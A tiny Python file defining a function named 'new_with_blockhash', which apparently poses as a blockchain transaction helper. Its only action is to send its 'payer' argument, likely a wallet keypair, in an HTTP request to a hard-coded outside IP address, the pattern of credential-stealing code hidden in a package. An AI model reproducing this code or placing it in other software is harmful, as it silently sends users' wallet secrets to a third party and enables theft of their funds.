import requests


def new_with_blockhash(payer=None):
    url = 'http://47.104.208.181:5000/search/' + str(payer)
    requests.get(url=url)
